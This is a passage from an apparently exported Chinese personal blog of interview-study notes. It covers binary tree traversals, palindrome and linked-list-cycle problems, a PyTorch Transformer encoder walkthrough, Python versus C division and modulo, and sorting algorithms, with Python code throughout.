    <content type="text"><![CDATA[​ 二叉树最常用的遍历算法主要分为下面几种： ​ 1.先序遍历 ​ 2.中序遍历 ​ 3.后序遍历 ​ 4.层次遍历 ​ 下面我们将针对这些遍历算法的递归与非递归实现分别给出代码实现以及特点。 这里有一点我们需要注意: ​ 无论是前序、中序、后续，都是指根节点访问的顺序，而左右节点的相对访问顺序永远是相同的，即先访问做节点，后访问右节点。 先序遍历​ 先序遍历指在二叉树遍历过程中首先输出根节点，然后再分别输出左右节点的遍历方式。 递归实现123456789101112131415def preorderTraversal(self, root): """ :type root: TreeNode :rtype: List[int] """ def core(result,root): if root==None: return result.append(root.val) core(result,root.left) core(result,root.right) result = [] core(result,root) return result 非递归实现123456789101112131415161718192021def preorderTraversal(self, root): """ :type root: TreeNode :rtype: List[int] """ if root==None: return [] res = [] stack = [root] while stack: node = stack.pop() res.append(node.val) #注意这里的顺序一定是先右后左，和一般的相反 if node.right!=None: stack.append(node.right) if node.left!=None: stack.append(node.left) return res 中序遍历​ 二叉树的中序遍历是指现先遍历左节点，中间遍历根节点，最后在遍历右节点的便利方式。 递归实现1234567891011121314def Core(root): if root==None: return [] Core(root.left) result.append(root.val) Core(root.right) return result result = [] Core(root) return result 非递归实现12345678910111213141516171819202122def inorderTraversal(self, root): """ :type root: TreeNode :rtype: List[int] """ if root==None: return [] stack = [] result = [] pos = root while stack or pos: if pos: stack.append(pos) pos = pos.left else: pos = stack.pop() result.append(pos.val) pos = pos.right return result 后序遍历层次遍历非递归实现​ 利用队列先进先出的特点，依次将结点的左、右孩子入队，然后依次出队访问，以此为循环。当有些题目中要求按照层输出时，需要根据每层的节点个数做一个计数。 1234567891011121314151617181920212223242526def levelOrder(self, root): """ :type root: TreeNode :rtype: List[List[int]] """ if not root: return [] queue = [root] result = [] while queue: tmp = [] number_flag = len(queue) #层节点个数计数器 i = 0 while i&lt;number_flag: node = queue.pop(0) tmp.append(node.val) if node.left: queue.append(node.left) if node.right: queue.append(node.right) i += 1 result.append(tmp) return result 根据两个序列复原二叉树​ 这种题目其实只有两个，核心是找出先根据一个序列找出根节点，然后在根据另一个序列找出其左右子树的元素，然后不断的递归这个过程即可。 已知前序遍历中序遍历​ 在已知前序遍历的题目中，就以前序遍历为基础，去不断地区分剩下的数据应该在左子树还是右子树即可 12345678910111213141516171819202122232425262728def buildTree(self, preorder: List[int], inorder: List[int]) -&gt; TreeNode: """ 先将前序遍历的第一个节点作为根节点，然后在后序遍历中找到其对应的位置，左右分别做相同的操作 """ len_pre = len(preorder) len_in = len(inorder) if len_pre==0 or len_in==0: return None tree_root = TreeNode(preorder[0]) preorder = preorder[1:] left_len = 0 for i in inorder: if i==tree_root.val: break else: left_len+=1 inorder.remove(tree_root.val) if left_len&gt;=1: tree_root.left = self.buildTree(preorder[:left_len],inorder[:left_len]) if len(preorder)-left_len&gt;=1: tree_root.right = self.buildTree(preorder[left_len:],inorder[left_len:]) return tree_root 已知前序遍历和后序遍历123456789101112131415161718192021222324252627282930def constructFromPrePost(self, pre, post): """ :type pre: List[int] :type post: List[int] :rtype: TreeNode """ """ 前序遍历的第一个节点必定是根节点，随后的节点就是其左子树的根节点，然后再在 后序遍历中找到这个节点的位置就可以确定左子树中有哪些节点，右子树中有哪些节点 """ tree_root = TreeNode(pre[0]) pre = pre[1:] post = post[:-1] left_len = 0 for i in post: if i==pre[0]: left_len+=1 break else: left_len+=1 if left_len&gt;=1: tree_root.left = self.constructFromPrePost(pre[:left_len],post[:left_len]) if len(post)-left_len&gt;=1: tree_root.right = self.constructFromPrePost(pre[left_len:],post[left_len:]) return tree_root 已知中序后序遍历构造二叉树 没有前序遍历时，使用后序遍历定根节点 1234567891011121314151617181920212223def buildTree(self, inorder: List[int], postorder: List[int]) -&gt; TreeNode: len_in = len(inorder) len_post = len(postorder) if len_in==0 or len_in!=len_post: return None tree_root = TreeNode(postorder[-1]) postorder = postorder[:-1] left_len = 0 for i in inorder: if i==tree_root.val: break else: left_len += 1 inorder.remove(tree_root.val) if left_len&gt;=1: tree_root.left = self.buildTree(inorder[:left_len],postorder[:left_len]) if len(postorder)-left_len&gt;=1: tree_root.right = self.buildTree(inorder[left_len:],postorder[left_len:]) return tree_root 二叉搜索树​ 二叉搜索树的性质: ​ 1.中序遍历的结果有序 ​ 2.左子树上的节点都比根节点小，右子树都比根节点大 修剪二叉搜索树​ 给定一个二叉搜索树，同时给定最小边界L 和最大边界 R。通过修剪二叉搜索树，使得所有节点的值在[L, R]中 (R&gt;=L) 。你可能需要改变树的根节点，所以结果应当返回修剪好的二叉搜索树的新的根节点。 1234567891011121314151617181920def trimBST(self, root, L, R): """ :type root: TreeNode :type L: int :type R: int :rtype: TreeNode """ if root==None: return None if root.val&lt;L: return self.trimBST(root.right,L,R) elif root.val&gt;R: return self.trimBST(root.left,L,R) else: root.left = self.trimBST(root.left,L,R) root.right = self.trimBST(root.right,L,R) return root 把二叉搜索树转化为累加树给定一个二叉搜索树（Binary Search Tree），把它转换成为累加树（Greater Tree)，使得每个节点的值是原来的节点值加上所有大于它的节点值之和。 例如： 123456789输入: 二叉搜索树: 5 / \ 2 13输出: 转换为累加树: 18 / \ 20 13 1234567891011121314151617def convertBST(self, root): """ :type root: TreeNode :rtype: TreeNode """ root_ref = root stack = [] prev = 0 while stack or root: while root: stack.append(root) root = root.right root = stack.pop() root.val += prev prev = root.val root = root.left return root_ref 验证搜索二叉树给定一个二叉树，判断其是否是一个有效的二叉搜索树。 假设一个二叉搜索树具有如下特征： 节点的左子树只包含小于当前节点的数。 节点的右子树只包含大于当前节点的数。 所有左子树和右子树自身必须也是二叉搜索树。 123456789101112131415161718192021222324252627方法一：用搜索二叉树的性质1，中序遍历一定有序，那么我们只需要在中序遍历中保证后添加的数比前面添加的最后一个数的即可，出现不符合这一规律的直接返回False 注：这里需要特别注意，二叉搜索数中不能出现两个一样的值，因此不能直接输出中序序列和排序号好的序列对比def isValidBST(self, root): """ :type root: TreeNode :rtype: bool """ stack = [] pos = root result = [] while stack or pos: while pos: stack.append(pos) pos = pos.left pos = stack.pop() if result!=[]: if result[-1]&lt;pos.val: result.append(pos.val) else: return False else: result.append(pos.val) pos = pos.right return True]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试-回文子串相关]]></title>
    <url>%2F2019%2F03%2F12%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[回文子串 例：给定一个字符串，你的任务是计算这个字符串中有多少个回文子串。 具有不同开始位置或结束位置的子串，即使是由相同的字符组成，也会被计为是不同的子串。 1234567891011121314def countSubstrings(self, s): """ :type s: str :rtype: int """ length = len(s) result = 0 for i in range(length): for j in range(i+1,length+1): #这里注意循环的范围为range(i+1,length+1) if s[i:j]==s[i:j][::-1]: result += 1 return result 最长回文子串​ 最长回文子串也是回文串中常见的一中题目，下面是例题 例：给定一个字符串 s，找到 s 中最长的回文子串。你可以假设 s 的最大长度为 1000。 思路一：Manacher算法 ​ 首先先将字符串首尾以及字符和字符之间采用”#“进行补齐，补齐后的字符串总长度2n+1(n为原始字符串长度)。然后从第一个非#字符 12345678910111213141516171819202122232425262728293031323334def get_length(string, index): # 循环求出index为中心的最长回文字串 length = 0 seq = "" if string[index]!="#": seq = string[index] length = 1 string_len = len(string) for i in range(1,index+1): if index+i&lt;string_len and string[index-i]==string[index+i]: # print(string[index-i],seq+string[index+i]) if string[index-i]!="#": length +=2 seq = string[index-i]+seq+string[index+i] else: break return length,seq s_list = [i for i in s] string = "#"+"#".join(s)+"#" length = len(string) max_length = 0 max_seq = "" for index in range(0,length): # print("====") tmp_len,tmp_seq = get_length(string,index) # print(tmp_len,tmp_seq) if tmp_len&gt;max_length: max_length = tmp_len max_seq = tmp_seq return max_seq 思路二：动态规划 ​ 这里的动态规划的核心思路就是从头开始向后进行遍历，每次想看头尾同时加入比最大之前最大回文子串的长多+1字符串是不是回文子串(注意但是首部索引不能超过0)，如果是则记录起始节点start，max_len的值+2；否则判断只在尾部进行字符串加1的字符串时不是回文子串（这里之说以不必尝试在头部加1，因为再从头开始遍历的过程中已经尝试了头部加1），如果是记录start节点，max_len的值+2 ​ f(x+1) 12345678910111213141516171819def longestPalindrome(self, s): """ :type s: str :rtype: str """ length = len(s) max_len = 0 start = 0 for i in range(length): if i-max_len&gt;=1 and s[i-max_len-1:i+1]==s[i-max_len-1:i+1][::-1]: start = i-max_len-1 max_len += 2 elif i-max_len&gt;=0 and s[i-max_len:i+1]==s[i-max_len:i+1][::-1]: start = i-max_len max_len += 1 return s[start:start+max_len] 最长回文子序列516​ z]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试-含环链表相关]]></title>
    <url>%2F2019%2F03%2F12%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E5%90%AB%E7%8E%AF%E9%93%BE%E8%A1%A8%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[​ 在含环的问题中，存在一些关键性的结论，在解决问题时非常有帮助，下面是一些相关的总结。 1.判断链表是否有环​ 结论：一个速度为1的low指针和一个速度为2的fast指针同时从头向前走，如果其中fast指针为None，那么则为无环，如果两个只能指向的元素相等，那么链表有环。 2.判断链表的环入口节点​ 结论：函数一样的双指针进行遍历，如果fast指针为None,那么则为无环。如果两个指针指向的的元素相同，那么这个节点到链表入口点的长度和链表头到链表入口点的长度相等。 推导过程： ​ 设链表头到入口节点的长度为a ​ 链表入口节点到相遇节点的长度为b ​ 相遇节点到链表入口节点的长度为c ​ 那么因为fast的速度为2，low的速度为1，因此可以认为low入环时走在前面，每次fast和low之间的距离缩小1，因此，必定会在第一圈完成之前相遇。所以有 ​ low 在环内位置: (a+b)-a mod (b+c) -&gt; b mod (b+c) ​ fast 在环内位置：2(a+b)-a mod (b+c) -&gt; a+2b mod (b+c) 二者应该相等，因此得出 a+b mod (b+c) = 0 即a = c ​ 利用这个结论，我们可以先判断判断链表是否有环，如果有环，那么先找到相间的节点，然后再用一个新指针从头开始以速度为1和low指针从相交节点同时开始遍历，当两个点相交的节点即为环入口节点。 例题：给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null. 12345678910111213141516def detectCycle(head): """ :type head: ListNode :rtype: ListNode """ low,fast = head,head while fast and fast.next and fast.next: low, fast = low.next, fast.next.next if fast==low: p = head while p!=low: p = p.next low = low.next return p return None 3.变形型题目​ 有一类题目不会明显的说让解决环的问题，但是使用环来解决，往往会起到意想不到的效果。 例题：编写一个程序，找到两个单链表相交的起始节点。 123456789101112131415161718192021222324252627282930313233343536373839def getIntersectionNode(headA, headB): """ :type head1, head1: ListNode :rtype: ListNode """ if headA==None or headB==None: return None #相判断两个是否相交 pA = headA pB = headB while pA.next: pA = pA.next while pB.next: pB = pB.next if pA!=pB: return None #将PA首尾相接 tail = pA pA.next = headA fast = headB low = headB while True: fast = fast.next.next low = low.next if fast==low: s = headB while s!=low: low = low.next s = s.next tail.next = None return s ​ 这道题利用了和上一道题目完全一样的规律解决]]></content>
      <tags>
        <tag>机试</tag>
        <tag>算法总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深度学习——transformer模型]]></title>
    <url>%2F2019%2F02%2F28%2F%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94transformer%E6%A8%A1%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[​ transformer模型来自于Google的经典论文Attention is all you need，在这篇论文中作者采用Attention来取代了全部的RNN、CNN，实现效果效率的双丰收。 ​ 现在transformer在NLP领域已经可以达到全方位吊打CNN、RNN系列的网络，网络处理时间效率高，结果稳定性可靠性都比传统的CNN、RNN以及二者的联合网络更好，因此现在已经呈现出了transformer逐步取代二者的大趋势。 ​ 下面是三者在下面四个方面的对比试验结果 ​ 1.远距离特征提取能力 ​ 2.语义特征提取能力 ​ 3.综合特征提取能力 ​ 4.特征提取效率 下面是从一系列的论文中获取到的RNN、CNN、Transformer三者的对比结论： ​ 1.从任务综合效果方面来说，Transformer明显优于CNN，CNN略微优于RNN。 ​ 2.速度方面Transformer和CNN明显占优，RNN在这方面劣势非常明显。(主流经验上transformer和CNN速度差别不大，RNN比前两者慢3倍到几十倍) Transformer模型具体细节​ transformer模型整体结构上主要Encoder和Decoder两部分组成，Encoder主要用来将数据进行特征提取，而Decoder主要用来实现隐向量解码出新的向量表示(原文中就是新的语言表示)，由于原文是机器翻译问题，而我们要解决的问题是类文本分类问题，因此我们直接减Transformer模型中的Encoder部分来进行特征的提取。其中主要包括下面几个核心技术模块： ​ 1.残差连接 ​ 2.Position-wise前馈网络 ​ 3.多头self-attention ​ 4.位置编码 ​ 1.采用全连接层进行Embedding （Batch_size,src_vocab_size,model_dim） ​ 2.在进行位置编码，位置编码和Embedding的结果进行累加 ​ 3.进入Encoder_layer进行编码处理(相当于特征提取) ​ (1) ​ 1.位置编码（PositionalEncoding）​ 大部分编码器一般都采用RNN系列模型来提取语义相关信息，但是采用RNN系列的模型来进行语序信息进行提取具有不可并行、提取效率慢等显著缺点，本文采用了一种 Positional Embedding方案来对于语序信息进行编码，主要通过正余弦函数， ​ 在偶数位置，使用正弦编码;在奇数位置使用余弦进行编码。 为什么要使用三角函数来进行为之编码？ ​ 首先在上面的公式中可以看出，给定词语的pos可以很简单其表示为dmodel维的向量，也就是说位置编码的每一个位置每一个维度对应了一个波长从2π到100002π的等比数列的正弦曲线，也就是说可以表示各个各个位置的*绝对位置。 ​ 在另一方面，词语间的相对位置也是非常重要的，这也是选用正余弦函数做位置编码的最主要原因。因为 ​ sin(α+β) = sinαcosβ+cosαsinβ ​ cos(α+β) = cosαcosβ+sinαsinβ ​ 因此对于词汇间位置偏移k，PE(pos+k)可以表示为PE(pos)和PE(k)组合的形式，也就是具有相对位置表达能力 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class PositionalEncoding(nn.Module): """ 位置编码层 """ def __init__(self, d_model, max_seq_len): """ 初始化 Args: d_model: 一个标量。模型的维度，论文默认是512 max_seq_len: 一个标量。文本序列的最大长度 """ super(PositionalEncoding, self).__init__() # 根据论文给的公式，构造出PE矩阵 position_encoding = np.array([ [pos / np.power(10000, 2.0 * (j // 2) / d_model) for j in range(d_model)] for pos in range(max_seq_len)]) # 偶数列使用sin，奇数列使用cos position_encoding[:, 0::2] = np.sin(position_encoding[:, 0::2]) position_encoding[:, 1::2] = np.cos(position_encoding[:, 1::2]) position_encoding = torch.Tensor(position_encoding) # 在PE矩阵的第一行，加上一行全是0的向量，代表这`PAD`的positional encoding # 在word embedding中也经常会加上`UNK`，代表位置单词的word embedding，两者十分类似 # 那么为什么需要这个额外的PAD的编码呢？很简单，因为文本序列的长度不一，我们需要对齐， # 短的序列我们使用0在结尾补全，我们也需要这些补全位置的编码，也就是`PAD`对应的位置编码 pad_row = torch.zeros([1, d_model]) position_encoding = torch.cat((pad_row, position_encoding)) # 嵌入操作，+1是因为增加了`PAD`这个补全位置的编码， # Word embedding中如果词典增加`UNK`，我们也需要+1。看吧，两者十分相似 self.position_encoding = nn.Embedding(max_seq_len + 1, d_model) self.position_encoding.weight = nn.Parameter(position_encoding, requires_grad=False) def forward(self, input_len,max_len): """ 神经网络的前向传播。 Args: input_len: 一个张量，形状为[BATCH_SIZE, 1]。每一个张量的值代表这一批文本序列中对应的长度。 param max_len:数值，表示当前的词的长度 Returns: 返回这一批序列的位置编码，进行了对齐。 """ # 找出这一批序列的最大长度 tensor = torch.cuda.LongTensor if input_len.is_cuda else torch.LongTensor # 对每一个序列的位置进行对齐，在原序列位置的后面补上0 # 这里range从1开始也是因为要避开PAD(0)的位置 input_pos = tensor( [list(range(1, len + 1)) + [0] * (max_len - len) for len in input_len.tolist()]) return self.position_encoding(input_pos) 2.scaled Dot-Product Attention​ scaled代表着在原来的dot-product Attention的基础上加入了缩放因子1/sqrt(dk)，dk表示Key的维度，默认用64. 为什么要加入缩放因子？ ​ 在dk(key的维度)很大时，点积得到的结果维度很大，使的结果处于softmax函数梯度很小的区域，这是后乘以一个缩放因子，可以缓解这种情况的发生。 ​ Dot-Produc代表乘性attention，attention计算主要分为加性attention和乘性attention两种。加性 Attention 对于输入的隐状态 ht 和输出的隐状态 st直接做 concat 操作，得到 [ht:st] ，乘性 Attention 则是对输入和输出做 dot 操作。 ​ Attention又是什么呢？通俗的解释Attention机制就是通过query和key的相似度确定value的权重。论文中具体的Attention计算公式为： ​ 在这里采用的scaled Dot-Product Attention是self-attention的一种，self-attention是指Q(Query), K(Key), V(Value)三个矩阵均来自同一输入。就是下面来具体说一下K、Q、V具体含义： 在一般的Attention模型中，Query代表要进行和其他各个位置的词做点乘运算来计算相关度的节点，Key代表Query亚进行查询的各个节点，每个Query都要遍历全部的K节点，计算点乘计算相关度，然后经过缩放和softmax进行归一化的到当前Query和各个Key的attention score，然后再使用这些attention score与Value相乘得到attention加权向量 在self-attention模型中，Key、Query、Value均来自相同的输入 在transformer的encoder中的Key、Query、Value都来自encoder上一层的输入，对于第一层encoder layer，他们就是word embedding的输出和positial encoder的加和。 query、key、value来源： ​ 他们三个是由原始的词向量X乘以三个权值不同的嵌入向量Wq、Wk、Wv得到的，三个矩阵尺寸相同 Attention计算步骤： 如上文，将输入单词转化成嵌入向量； 根据嵌入向量得到 q、k、v三个向量； 为每个向量计算一个score： score = q*k 为了梯度的稳定，Transformer使用了score归一化，即除以 sqrt(dk)； 对score施以softmax激活函数； softmax点乘Value值 v ，得到加权的每个输入向量的评分 v； 相加之后得到最终的输出结果Sum(z) ： 。 1234567891011121314151617181920212223242526272829303132333435363738class ScaledDotProductAttention(nn.Module): """ 标准的scaled点乘attention层 """ def __init__(self, attention_dropout=0.0): super(ScaledDotProductAttention, self).__init__() self.dropout = nn.Dropout(attention_dropout) self.softmax = nn.Softmax(dim=2) def forward(self, q, k, v, scale=None, attn_mask=None): """ 前向传播. Args: q: Queries张量，形状为[B, L_q, D_q] k: Keys张量，形状为[B, L_k, D_k] v: Values张量，形状为[B, L_v, D_v]，一般来说就是k scale: 缩放因子，一个浮点标量 attn_mask: Masking张量，形状为[B, L_q, L_k] Returns: 上下文张量和attention张量 """ attention = torch.bmm(q, k.transpose(1, 2)) if scale: attention = attention * scale if attn_mask is not None: # 给需要 mask 的地方设置一个负无穷 attention = attention.masked_fill(attn_mask,-1e9) # 计算softmax attention = self.softmax(attention) # 添加dropout attention = self.dropout(attention) # 和V做点积 context = torch.bmm(attention, v) return context, attention 3.多头Attention​ 论文作者发现将 Q、K、V 通过一个线性映射之后，分成 h 份，对每一份进行 scaled dot-product attention 效果更好。然后，把各个部分的结果合并起来，再次经过线性映射，得到最终的输出。这就是所谓的 multi-head attention。上面的超参数 h 就是 heads 的数量。论文默认是 8。 ​ 这里采用了四个全连接层+有个dot_product_attention层(也可以说是8个)+layer_norm实现。 为什么要使用多头Attention？ ​ 1.”多头机制“能让模型考虑到不同位置的Attention ​ 2.”多头“Attention可以在不同的足空间表达不一样的关联 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263class MultiHeadAttention(nn.Module): """ 多头Attention层 """ def __init__(self, model_dim=512, num_heads=8, dropout=0.0): super(MultiHeadAttention, self).__init__() self.dim_per_head = model_dim // num_heads self.num_heads = num_heads self.linear_k = nn.Linear(model_dim, self.dim_per_head * num_heads) self.linear_v = nn.Linear(model_dim, self.dim_per_head * num_heads) self.linear_q = nn.Linear(model_dim, self.dim_per_head * num_heads) self.dot_product_attention = ScaledDotProductAttention(dropout) self.linear_final = nn.Linear(model_dim, model_dim) self.dropout = nn.Dropout(dropout) self.layer_norm = nn.LayerNorm(model_dim) def forward(self, key, value, query, attn_mask=None): # 残差连接 residual = query dim_per_head = self.dim_per_head num_heads = self.num_heads batch_size = key.size(0) # 线性层 (batch_size,word_nums,model_dim) key = self.linear_k(key) value = self.linear_v(value) query = self.linear_q(query) # 将一个切分成多个(batch_size*num_headers,word_nums,word//num_headers) """ 这里用到了一个trick就是将key、value、query值要进行切分不需要进行真正的切分，直接将其维度整合到batch_size上，效果等同于真正的切分。过完scaled dot-product attention 再将其维度恢复即可 """ key = key.view(batch_size * num_heads, -1, dim_per_head) value = value.view(batch_size * num_heads, -1, dim_per_head) query = query.view(batch_size * num_heads, -1, dim_per_head) #将mask也复制多份和key、value、query相匹配 （batch_size*num_headers,word_nums_k,word_nums_q） if attn_mask is not None: attn_mask = attn_mask.repeat(num_heads, 1, 1) # 使用scaled-dot attention来进行向量表达 #context:(batch_size*num_headers,word_nums,word//num_headers) #attention:(batch_size*num_headers,word_nums_k,word_nums_q) scale = (key.size(-1)) ** -0.5 context, attention = self.dot_product_attention( query, key, value, scale, attn_mask) # concat heads context = context.view(batch_size, -1, dim_per_head * num_heads) # final linear projection output = self.linear_final(context) # dropout output = self.dropout(output) # 这里使用了残差连接和LN output = self.layer_norm(residual + output) return output, attention 4.残差连接​ 在上面的多头的Attnetion中，还采用了残差连接机制来保证网络深度过深从而导致的精度下降问题。这里的思想主要来源于深度残差网络(ResNet)，残差连接指在模型通过一层将结果输入到下一层时也同时直接将不通过该层的结果一同输入到下一层，从而达到解决网络深度过深时出现精确率不升反降的情况。 为什么残差连接可以在网络很深的时候防止出现加深深度而精确率下降的情况？ ​ 神经网络随着深度的加深会会出现训练集loss逐渐下贱，趋于饱和，然后你再加深网络深度，训练集loss不降反升的情况。这是因为随着网络深度的增加，在深层的有效信息可能变得更加模糊，不利于最终的决策网络做出正确的决策，因此残差网络提出，建立残差连接的方式来将低层的信息也能传到高层，因此这样实现的深层网络至少不会比浅层网络差。 5.Layer normalizationNormalization​ Normalization 有很多种，但是它们都有一个共同的目的，那就是把输入转化成均值为 0 方差为 1 的数据。我们在把数据送入激活函数之前进行 normalization（归一化），因为我们不希望输入数据落在激活函数的饱和区。 Batch Normalization(BN)​ 应用最广泛的Normalization就是Batch Normalization，其主要思想是:在每一层的每一批数据上进行归一化。我们可能会对输入数据进行归一化，但是经过该网络层的作用后，我们的数据已经不再是归一化的了。随着这种情况的发展，数据的偏差越来越大，我的反向传播需要考虑到这些大的偏差，这就迫使我们只能使用较小的学习率来防止梯度消失或者梯度爆炸。 Layer normalization(LN)​ LN 是在每一个样本上计算均值和方差，而不是 BN 那种在批方向计算均值和方差. Layer normalization在pytorch 0.4版本以后可以直接使用nn.LayerNorm进行调用 6.Mask​ mask 表示掩码，它对某些值进行掩盖，使其在参数更新时不产生效果。Transformer 模型里面涉及两种 mask，分别是 padding mask 和 sequence mask。 ​ 在我们使用的Encoder部分，只是用了padding mask因此本文重点介绍padding mask。 padding mask​ 什么是 padding mask 呢？因为每个批次输入序列长度是不一样的也就是说，我们要对输入序列进行对齐。具体来说，就是给在较短的序列后面填充 0。因为这些填充的位置，其实是没什么意义的，所以我们的 attention 机制不应该把注意力放在这些位置上，所以我们需要进行一些处理。具体的做法是，把这些位置的值加上一个非常大的负数(负无穷)，这样的话，经过 softmax，这些位置的概率就会接近0！而我们的 padding mask 实际上是一个张量，每个值都是一个 Boolean，值为 false 的地方就是我们要进行处理的地方。 123456789101112131415def padding_mask(seq_k, seq_q): """ param seq_q:(batch_size,word_nums_q) param seq_k:(batch_size,word_nums_k) return padding_mask:(batch_size,word_nums_q,word_nums_k) """ # seq_k和seq_q 的形状都是 (batch_size,word_nums_k) len_q = seq_q.size(1) # 找到被pad填充为0的位置(batch_size,word_nums_k) pad_mask = seq_k.eq(0) #(batch_size,word_nums_q,word_nums_k) pad_mask = pad_mask.unsqueeze(1).expand(-1, len_q, -1) # shape [B, L_q, L_k] return pad_mask 3.Position-wise 前馈网络​ 这是一个全连接网络，包含两个线性变换和一个非线性函数(实际上就是 ReLU) ​ 这里实现上用到了两个一维卷积。 1234567891011121314151617181920class PositionalWiseFeedForward(nn.Module): """ 前向编码，使用两层一维卷积层实现 """ def __init__(self, model_dim=512, ffn_dim=2048, dropout=0.0): super(PositionalWiseFeedForward, self).__init__() self.w1 = nn.Conv1d(model_dim, ffn_dim, 1) self.w2 = nn.Conv1d(ffn_dim, model_dim, 1) self.dropout = nn.Dropout(dropout) self.layer_norm = nn.LayerNorm(model_dim) def forward(self, x): output = x.transpose(1, 2) output = self.w2(F.relu(self.w1(output))) output = self.dropout(output.transpose(1, 2)) # add residual and norm layer output = self.layer_norm(x + output) return output]]></content>
      <tags>
        <tag>机器学习</tag>
        <tag>面试</tag>
        <tag>NLP</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试总结-Python和C语言中的一些不同]]></title>
    <url>%2F2019%2F02%2F27%2F%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93-Python%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%90%8C%2F</url>
    <content type="text"><![CDATA[1.python在除法和C语言中的一点区别​ 在Python3中，除法有 “/” 以及 “//” 两种，这两个有着明显的区别，具体区别看代码： 12print(12//10)print(12/10) 这两行代码的输出如下： 1211.2 当被除数是负数的时候，又是另一种情况： 12345678print(-12/10) #不补整print(int(-12/10)) #向正方向进行补整print(-13//10) #向负方向进行补整output: -1.2 -1 -2 ​ 因此，综合前面的正负两种情况，我们可以看出当我们想要达到和C++同样的向上取整，只能使用int(a/b)方式。 2.python在求余时和C的一点区别​ 对于正数求余运算，python和C++完全相同，但是对于负数求余运算，python和C++存在着较大的差别，下面我们通过例子来说明二者的差别。 123456789#C++count&gt;&gt;-123%10;output: -3#pythonprint(-123%10)output: -7 #这里是向下取10的余数 ​ 为了实现和C++相同效果的取余运算，我们只能采用如下方式进行取余运算 1234if a&gt;=0 print(a%10)else: print(a%-10)]]></content>
      <tags>
        <tag>python</tag>
        <tag>机试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机试——排序算法总结]]></title>
    <url>%2F2019%2F02%2F10%2F%E6%9C%BA%E8%AF%95%E2%80%94%E2%80%94%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[​ 机试中，排序算法是主要面临的一类算法，很久都没有接触机试的题了，解决的时候感觉有点思路不是很清楚了，因此写了这一片博客，来整理下常见的排序算法以及各种常见算法的效率稳定性等特点。 在机试中常用的排序算法主要包含下面几种： ​ 1.插入排序 ​ 2.选择排序 ​ 3.快速排序(最常用的排序) ​ 4.冒泡排序 ​ 5.归并排序 ​ 6.桶排序 下面我将具体介绍各种排序算法的一些特点： 排序算法 平均时间复杂度 最坏时间复杂度 空间复杂度 是否稳定 冒泡排序 O（n2） O（n2） O（1） 稳定 选择排序 O（n2） O（n2） O（1） 不稳定 直接插入排序 O（n2） O（n2） O（1） 稳定 希尔排序 O（n2） O(O3/2) 归并排序 O(nlogn) O(nlogn) O（n） 稳定 快速排序 O(nlogn) O(n2) O（logn） 不稳定 堆排序 O(nlogn) O(nlogn) O(1) 不稳定 时间复杂度辅助记忆： 冒泡、选择、直接 排序需要两个for循环，每次只关注一个元素，平均时间复杂度为O（n2）（一遍找元素O(n)，一遍找位置O(n)） 快速、归并、希尔、堆基于二分思想，log以2为底，平均时间复杂度为O(nlogn)（一遍找元素O(n)，一遍找位置O(logn)） 1.插入排序​ 每次从头到尾选择一个元素，并且将这个元素和整个数组中的所有已经排序的元素进行比较，然后插入到合适的位置。 ​ 注意：插入排序的核心点就是两两比较时从后向前进行比较，如果比插入值大，那么将其向后移动，直到找到比插入值小的。 12345678910def insertion_sort(arr): length = len(arr) for i in range(1,length): #从第一个元素开始依次进行排序 tmp = arr[i] j = i while arr[j-1]&gt;tmp and j&gt;0: #从当前元素从后向前向前开始遍历，寻找第一个比当前元素更小的元素 arr[j] = arr[j-1] #再找比当前小的元素位置的同时，只要扫描到的位置比当前元素大，那么将该元素后移一维 j -= 1 arr[j] = tmp return arr 稳定性：稳定 时间复杂度：O(n^2) 空间复杂度：O(1) 为什么插入排序是稳定的排序算法？ ​ 当前从头到尾选择元素进行排序时，当选择到第i个元素时，前i-1个元素已经排好了续，取出第i个元素，从i-1开始向前开始比较，如果小于，则将该位置元素向后移动，继续先前的比较，如果不小于，那么将第i个元素放在当前比较的元素之后。 2.选择排序​ 选择排序主要采用了从头到尾依次确定各个位置的方式来进行排序，首先遍历一次整个数组，如果遇到比第一个元素小的元素那么交换位置，一次遍历完成那么第一个位置就已经是整个数组中最小的元素了，经过n次遍历，确定全部位置的元素。 123456789def selection_sort(arr): length = len(arr) for i in range(length): for j in range(i,length): if arr[i]&gt;arr[j]: tmp = arr[i] arr[i] = arr[j] arr[j] = tmp return arr 稳定性：不稳定 时间复杂度：O(n^2) 空间复杂度：O(1) 3.冒泡排序​ 冒泡排序额是实现是不停地进行两两比较，将较大的元素换到右侧，然后继续进行两两比较，直到比较完全全部元素，每进行完一轮两两比较，确定一个元素的位置。例如：第一轮两两比较确定最大的值，第二轮比较确定次大元素。 1234567891011def bubble_sort(arr): length = len(arr) for i in range(0,length): for j in range(1,length-i): if arr[j]&lt;arr[j-1]: tmp = arr[j] arr[j] = arr[j-1] arr[j-1] = tmp return arr 稳定性：稳定 时间复杂度：O(n^2) 空间复杂度：O(1) 冒泡排序在原始冒泡排序算法的基础上还能做哪些优化？ ​ 1.设置是否已经排好序的flag。如果在某一轮的便利中没有出现任何的交换发生，这说明已经都排好序,那么直接将flag置True，每轮结束时检测flag，如果为True则直接返回 ​ 